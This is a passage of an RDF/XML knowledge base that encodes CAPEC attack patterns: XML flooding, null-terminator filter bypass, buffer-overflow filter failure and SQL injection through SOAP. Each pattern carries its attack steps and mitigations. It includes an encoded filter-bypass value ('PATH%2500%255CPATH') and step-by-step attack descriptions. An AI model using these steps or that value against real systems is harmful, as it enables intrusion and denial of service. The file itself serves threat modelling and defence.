          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the target) Using a browser or an automated tool  an attacker records all instance of web services to process XML requests.TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the web service when the XML data sent to the service.::STEP:3:PHASE:Exploit:DESCRIPTION:(Launch a resource depletion attack) The attacker delivers a large number of XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.TECHNIQUE:Send a large number of crafted XML messages to the target URL.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must receive and process XML transactions.::An adverssary must possess the ability to generate a large amount of XML based messages to send to the target service.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Denial of service:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker272">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#523"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack272"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::Physical access to the system after it has left the manufacturer but before it is deployed at the victim location.::"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Advanced knowledge of the design of the system and it&apos;s operating system components and subcomponents.:LEVEL:High::SKILL:Malicious software creation.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Properly handle Null characters. Make sure canonicalization is properly applied. Do not pass Null characters to the underlying APIs.::Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack381">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#53">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:267::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Postfix  Null Terminate  and Backslash"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::158::172::173::171::74::20::697::707::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Experiment:DESCRIPTION:An attacker first probes to figure out what restrictions on input are placed by filter  such as a specific characters on the end of the URL.::STEP:2:PHASE:Exploit:DESCRIPTION:The attacker then injects a string of their choosing with a null terminator (using an alternate encoding such as %2500)  followed by a backslash (%255C)  followed by some additional characters that are required to keep the filter happy::STEP:3:PHASE:Exploit:DESCRIPTION:The malicious string then passes through the filter and passed to the underlying API. Everything after the null terminator is ignored. This may give an attacker the opportunity to access file system resources to which they should not have access and do other things. Some popular forms in which this takes place: PATH%2500%255CPATH(0x00)(0x5C)PATH(alternate encoding of the NULL)(additional characters required to pass filter)::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker273">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#147">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:528::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#XML Ping of the Death"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack273">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#147"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::400::770::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the target) Using a browser or an automated tool  an attacker records all instance of web services to process XML requests.TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Exploit:DESCRIPTION:(Launch a resource depletion attack) The attacker delivers a large number of small XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.TECHNIQUE:Send a large number of crafted small XML messages to the target URL.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption DoS: resource consumption (other)::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::400::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must receive and process XML transactions.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To send small XML messages:LEVEL:Low::SKILL:To use distributed network to launch the attack:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Transaction generator(s)/source(s) and ability to cause arrival of messages at the target with sufficient rapidity to overload target. Larger targets may be able to handle large volumes of requests so the attacker may require significant resources (such as a distributed network) to affect the target. However  the resources required of the attacker would be less than in the case of a simple flooding attack against the same target.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.::Pre-design: Use a language or compiler that performs automatic bounds checking.::Pre-design through Build: Compiler-based canary mechanisms such as StackGuard  ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking  it is not a complete solution.::Operational: Use OS-level preventative functionality. Not a complete solution.::Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack388">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#24">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:100::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Filter Failure through Buffer Overflow"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::120::119::118::74::20::680::733::697::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey) The attacker surveys the target application  possibly as a valid and authenticated userTECHNIQUE:Spidering web sites for inputs that involve potential filtering:TECHNIQUE:Brute force guessing of filtered inputs::STEP:2:PHASE:Experiment:DESCRIPTION:(Attempt injections) Try to feed overly long data to the system. This can be done manually or a dynamic tool (black box) can be used to automate this. An attacker can also use a custom script for that purpose.TECHNIQUE:Brute force attack through black box penetration test tool.:TECHNIQUE:Fuzzing of communications protocols:TECHNIQUE:Manual testing of possible inputs with attack data.::STEP:3:PHASE:Experiment:DESCRIPTION:(Monitor responses) Watch for any indication of failure occurring. Carefully watch to see what happened when filter failure occurred. Did the data get in?TECHNIQUE:Boron tagging. Choose clear attack inputs that are easy to notice in output. In binary this is often 0xa5a5a5a5 (alternating 1s and 0s). Another obvious tag value is all zeroes  but it is not always obvious what goes wrong if the null values get into the data.:TECHNIQUE:Check Log files. An attacker with access to log files can look at the outcome of bad input.::STEP:4:PHASE:Exploit:DESCRIPTION:(Abuse the system through filter failure) An attacker writes a script to consistently induce the filter failure.TECHNIQUE:DoS through filter failure. The attacker causes the system to crash or stay down because of its failure to filter properly.:TECHNIQUE:Malicious code execution. An attacker introduces a malicious payload and executes arbitrary code on the target system.:TECHNIQUE:An attacker can use the filter failure to introduce malicious data into the system and leverage a subsequent SQL injection  Cross Site Scripting  Command Injection or similar weakness if it exists.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker271">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#385"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack271"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::471::345::346::602::311::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::Targeted software is utilizing application framework APIs::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A software program that allows a user to man-in-the-middle communications between the client and server  such as a man-in-the-middle proxy.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker30">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#627"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack30"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The target must be relying on valid GPS signal to perform critical operations.::"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The ability to spoof GPS signals is not trival.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to create spoofed GPS signals.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker270">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#467">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:62::NATURE:ChildOf:CAPEC ID:408::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Cross Site Identification"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack270">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#467"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::352::359::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::352::359::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The victim has an active session with the social networking site.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:An attacker should be able to create a payload and deliver it to the victim&apos;s browser.:LEVEL:High::SKILL:An attacker needs to know how to interact with various social networking sites (e.g.  via available APIs) to request information and how to send the harvested data back to the attacker.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Authenticate all servers and perform redundant checks when using DNS hostnames.::Utilize browsers that can warn users if URLs contain characters from different character sets.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack156"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implementation: Upgrade phone lines. Note this may be prohibitively expensive::Use strong access control such as two factor access control for administrative access to the switch::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack496"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker428">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#74"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack428"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::372::371::315::353::693::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::User state is maintained at least in some way in user-controllable locations  such as cookies or URL parameters.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary needs to have knowledge of state management as employed by the target application  and also the ability to manipulate the state in a meaningful way.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary needs a data tampering tool capable of generating and creating custom inputs to aid in the attack  like Fiddler  Wireshark  or a similar in-browser plugin (e.g.  Tamper Data for Firefox).::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker427">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#420"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack427"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The adversary must have the means and knowledge of how to communicate with the target in some manner.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker426">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#424"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack426"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The adversary must have the means and knowledge of how to communicate with the target in some manner.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Delete all default account credentials that may be put in by the product vendor.::Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.::Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.::Passwords need to be recycled to prevent aging  that is every once in a while a new password must be chosen.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack145"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Disable MSSQL xp_cmdshell directive on the database::Properly validate the data (syntactically and semantically) before writing it to the database.::Do not implicitly trust the data stored in the database. Re-validate it prior to usage to make sure that it is safe to use in a given context (e.g. as a command line argument).::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack346"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker425">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#423"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack425"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the types of things that the target likes.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random  brute-forcing or guessing becomes very difficult.::Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier  a new one is issued when the level of privilege changes.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack234"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Leverage file protection mechanisms to render these files accessible only to authorized parties.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack68"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Potential mitigations include requiring a unique login for each resource request  constraining local unprivileged access by disallowing simultaneous engagements of the resource  or limiting access to the resource to one access per IP address. In such scenarios  the adversary would have to increase engagements either by launching multiple sessions manually or programmatically to counter such defenses.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack31"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.::Implementation: Disallow the inclusion of DTDs as part of incoming messages.::Implementation: Use XML parsing tools that protect against DTD attacks.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack277"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Leverage anti-virus products to detect stop operations with known virus.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack115">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#456">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:441::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Infected Memory"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Tunnel communications through a secure proxy Design: Trust level separation for privileged / non privileged interactions (e.g.  two different browsers  two different users  two different operating systems  two different virtual machines)::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack284"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Limit privileges of user accounts so new service creation can only be performed by authorized administrators.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack510"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Enforce principle of least privilege::Design: Ensure that the program&apos;s compound parts  including all system dependencies  classpath  path  and so on  are secured to the same or higher level assurance as the program::Implementation: Host integrity monitoring::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack495"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Test custom written Regex with fuzzing to determine if the Regex is a poor one. Add timeouts to processes that handle the Regex logic. If an evil Regex is found rewrite it as a good Regex.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack143"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker429">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#427"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack429"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The adversary must have the means and knowledge of how to communicate with the target in some manner.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker117">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#441"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack117"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to the component currently deployed at a victim location.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Properly validate and sanitize/reject user input at the service provider.::Ensure that prepared statements or other mechanism that enables parameter binding is used when accessing the database in a way that would prevent the attackers&apos; supplied data from controlling the structure of the executed query.::At the database level  ensure that the database user used by the application in a particular context has the minimum needed privileges to the database that are needed to perform the operation. When possible  run queries against pre-generated views rather than the tables directly.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack309">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#110">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:66::NATURE:CanFollow:CAPEC ID:280::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#SQL Injection through SOAP Parameter Tampering"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::89::20::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Detect Incorrect SOAP Parameter Handling) The attacker tampers with the SOAP message parameters and looks for indications that the tampering caused a change in behavior of the targeted application.TECHNIQUE:The attacker tampers with the SOAP message parameters by injecting some special characters such as single quotes  double quotes  semi columns  etc. The attacker observes system behavior.::STEP:2:PHASE:Experiment:DESCRIPTION:(Probe for SQL Injection vulnerability) The attacker injects SQL syntax into vulnerable SOAP parameters identified during the Explore phase to search for unfiltered execution of the SQL syntax in a query.::STEP:3:PHASE:Exploit:DESCRIPTION:(Inject SQL via SOAP Parameters) The attacker injects SQL via SOAP parameters identified as vulnerable during Explore phase to launch a first or second order SQL injection attack.TECHNIQUE:An attacker performs a SQL injection attack via the usual methods leveraging SOAP parameters as the injection vector. An attacker has to be careful not to break the XML parser at the service provider which may prevent the payload getting through to the SQL query. The attacker may also look at the WSDL for the web service (if available) to better understand what is expected by the service provider.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker420">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#140"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack420"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::372::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must collect information from the user in a series of forms where each form has its own URL that the attacker can anticipate and the application must fail to detect attempts to access intermediate forms without first filling out the previous forms.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::All sensitive information must be handled over a secure connection.::Known vulnerabilities in DNS or router software or in operating systems must be patched as soon as a fix has been released and tested.::End users must ensure that they provide sensitive information only to websites that they trust  over a secure connection with a valid certificate issued by a well-known certificate authority.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack2"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker249">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#187"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack249"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::494::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker116">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#549">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Local Execution of Code"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack116">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#549"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::829::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Depending on the type of code executed by the adversary  the consequences of this attack pattern can vary widely.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::829::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Knowledge of the target system&apos;s vulnerabilities that can be capitalized on with malicious code.The adversary must be able to place the malicious code on the target system.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
